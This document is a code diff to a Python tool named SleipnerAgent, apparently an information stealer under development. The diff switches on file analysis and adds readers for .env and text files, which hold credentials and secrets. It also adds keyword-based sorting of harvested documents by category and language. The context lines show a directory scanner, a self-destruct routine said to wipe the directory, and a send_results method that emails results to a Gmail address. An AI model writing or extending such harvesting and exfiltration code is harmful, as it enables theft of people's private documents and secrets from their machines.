@@ -4,6 +4,7 @@ from ctypes import wintypes
 from pathlib import Path
 import smtplib
 from email.message import EmailMessage
+import json
 
 SAFE_MODE = True
 
@@ -16,7 +17,6 @@ TARGET_FILETYPES = [
     ]
 
 LANGDETECT_TO_NLTK_NAME = {
-    'bn': 'bengali',
     'da': 'danish',
     'nl': 'dutch',
     'en': 'english',
@@ -24,10 +24,8 @@ LANGDETECT_TO_NLTK_NAME = {
     'fr': 'french',
     'de': 'german',
     'el': 'greek',
-    'id': 'indonesian',
     'it': 'italian',
     'no': 'norwegian',
-    'fa': 'persian',
     'pt': 'portuguese',
     'ro': 'romanian',
     'ru': 'russian',
@@ -38,6 +36,7 @@ LANGDETECT_TO_NLTK_NAME = {
 
 class SleipnerAgent:
     def __init__(self):
+        self.load_keywords()
         self.potential_targets = None
         self.lantern = Lantern()
 
@@ -49,7 +48,8 @@ class SleipnerAgent:
 
             self._scan_files(self.enviroment_directory_paths)
             print(f"{len(self.potential_targets)} files found.")
-            # self._analyze_files()
+
+            self._analyze_files()
             
             # WARNING - DO NOT RUN THIS FUNCTION, IT WILL WIPE THE DIRECTORY
             # self.self_destruct()
@@ -57,6 +57,9 @@ class SleipnerAgent:
         else:
             self.send_results()
 
+    def load_keywords(self, path="categorizer_db.json"):
+        with open(path, "r", encoding="utf-8") as f:
+            self.keyword_map = json.load(f)
 
     def _install_local_modules(self) -> bool:
         ###################
@@ -67,6 +70,7 @@ class SleipnerAgent:
             import nltk
             from nltk.tokenize import word_tokenize, sent_tokenize
             from nltk.corpus import stopwords
+            from nltk.classify import NaiveBayesClassifier
 
             nltk_data_path = os.path.abspath("./nltk_data")
             nltk.data.path.append(nltk_data_path)
@@ -75,23 +79,25 @@ class SleipnerAgent:
                 nltk.download("punkt", quiet=True, download_dir=nltk_data_path)
             if not os.path.exists(os.path.join(nltk_data_path, "corpora", "stopwords")):
                 nltk.download("stopwords", quiet=True, download_dir=nltk_data_path)
+            if not os.path.exists(os.path.join(nltk_data_path, "tokenizers", "punkt_tab")):
+                nltk.download("punkt_tab", quiet=True, download_dir=nltk_data_path)
 
             self.word_tokenize = word_tokenize
             self.sent_tokenize = sent_tokenize
             self.stopwords = stopwords.words("english")
 
             print("Successfully imported NLTK.")
-            
 
         except ImportError:
             print("NLTK not found.")
             return False
         
+        
         #########################
         ##  INSTALL LANGDETECT ##
         #########################
         try:
-            from langdetect import detect, DetectorFactory
+            from langdetect import detect, DetectorFactory, LangDetectException
             DetectorFactory.seed = 42
             
             print("Successfully imported langdetect.")
@@ -350,34 +356,42 @@ class SleipnerAgent:
 
         return results
 
-    def _read_docx(self, file_path):
-
+    def _read_docx(self, file_path) -> str:
         packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
         sys.path.insert(0, packages_path)
-            
+
         try:
-            # Open the document
             doc = self.docx.Document(file_path)
-            
+
             print("--- NEW DOCX DOCUMENT ---")
-            
-            # Print all paragraphs
+
+            text_chunks = []
+
+            # Read paragraphs
             for para in doc.paragraphs:
-                if para.text.strip():  # Only print non-empty paragraphs
-                    print(para.text)
-            
-            # Handle tables if present
+                paragraph_text = para.text.strip()
+                if paragraph_text:
+                    # print(paragraph_text)
+                    text_chunks.append(paragraph_text)
+
+            # Read tables
             if doc.tables:
                 print("\n--- Tables ---\n")
                 for i, table in enumerate(doc.tables):
                     print(f"Table {i+1}:")
                     for row in table.rows:
-                        row_text = [cell.text for cell in row.cells]
-                        print(" | ".join(row_text))
+                        row_text = [cell.text.strip() for cell in row.cells if cell.text.strip()]
+                        if row_text:
+                            joined_row = " | ".join(row_text)
+                            print(joined_row)
+                            text_chunks.append(joined_row)
                     print("")
-                                
+
+            return "\n".join(text_chunks)
+
         except Exception as e:
             print(f"Error reading document: {str(e)}")
+            return ""
 
     def _read_pdf(self, file_path) -> str:
         packages_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'libs', 'packages')
@@ -393,7 +407,7 @@ class SleipnerAgent:
                 for i, page in enumerate(reader.pages):
                     page_text = page.extract_text()
                     if page_text:
-                        print(f"Page {i+1}:\n{page_text.strip()}\n")
+                        # print(f"Page {i+1}:\n{page_text.strip()}\n")
                         text += page_text + "\n"
 
                 return text.strip()
@@ -420,7 +434,7 @@ class SleipnerAgent:
                 if para.firstChild:
                     paragraph_text = para.firstChild.data.strip()
                     if paragraph_text:
-                        print(paragraph_text)
+                        # print(paragraph_text)
                         text += paragraph_text + "\n"
 
             return text.strip()
@@ -430,34 +444,102 @@ class SleipnerAgent:
             return ""
 
     def _read_env(self, file_path) -> str:
-        ...
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                lines = f.readlines()
+
+            env_lines = []
+            print("--- NEW ENV FILE ---")
+            for line in lines:
+                stripped = line.strip()
+                if not stripped or stripped.startswith("#"):
+                    continue  # skip empty lines and comments
+                # print(stripped)
+                env_lines.append(stripped)
+
+            return "\n".join(env_lines)
+
+        except Exception as e:
+            print(f"Error reading .env file: {str(e)}")
+            return ""
 
     def _read_txt(self, file_path) -> str:
-        ...
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                content = f.read()
+
+            print("--- NEW TXT FILE ---")
+            # print(content)
+            return content.strip()
+
+        except Exception as e:
+            print(f"Error reading .txt file: {str(e)}")
+            return ""
 
     def _scan_files(self, directory_paths, directory=None, filetypes=None):
         # Get all wanted text files in the system
         self.potential_targets = self.lantern.sense_surroundings(directory_paths, directory, filetypes)
 
+    def classify_with_keywords(self, content: str, lang_code: str) -> str:
+        tokens = set(self.word_tokenize(content.lower()))
+        best_category = None
+        best_score = 0
+
+        for category, langs in self.keyword_map.items():
+            keywords = langs.get(lang_code) or langs.get("en", [])  # fallback to English
+            score = sum(1 for word in tokens if word in keywords)
+
+            if score > best_score:
+                best_score = score
+                best_category = category
+
+        return best_category or "unknown"
+
+
     def _analyze_files(self):
+        from langdetect import detect, LangDetectException
+
         if not self.potential_targets:
             self._scan_files()
 
+        n = 1
         for filepath in self.potential_targets:
-            # print(filepath)
-            filetype = filepath.split(".")[-1]
+            if n < 10:
+
+                # print(filepath)
+                filetype = filepath.split(".")[-1]
+                
+                match filetype:
+                    case "docx":
+                        content = self._read_docx(filepath)
+                    case "pdf":
+                        content = self._read_pdf(filepath)
+                    case "odt":
+                        content = self._read_odt(filepath)
+                    case "env":
+                        content = self._read_env(filepath)
+                    case "txt":
+                        content = self._read_txt(filepath)
+                    case _: 
+                        content = "Unable to read document."
+
+                if content and content.strip():
+                    try:
+                        language = detect(content)
+                        print(f"[{filepath}] Detected language: {language}")
+                    except LangDetectException:
+                        print(f"[{filepath}] Language could not be detected.")
+
+                    try:
+                        category = self.classify_with_keywords(content, language)
+                        print(f"[{filepath}] → Category: {category} (Lang: {language})")
+                    except Exception as e:
+                        print(f"[{filepath}] could not be categorized. Reason: {e}")
+                else:
+                    print(f"[{filepath}] No readable content.")
+
+                n += 1
             
-            match filetype:
-                case "docx":
-                    self._read_docx(filepath)
-                case "pdf":
-                    self._read_pdf(filepath)
-                case "odt":
-                    self._read_odt(filepath)
-                case "env":
-                    ...
-                case "txt":
-                    ...
 
     def send_results(self, results:str) -> bool:
         to_email = "noreply.friedman@gmail.com"
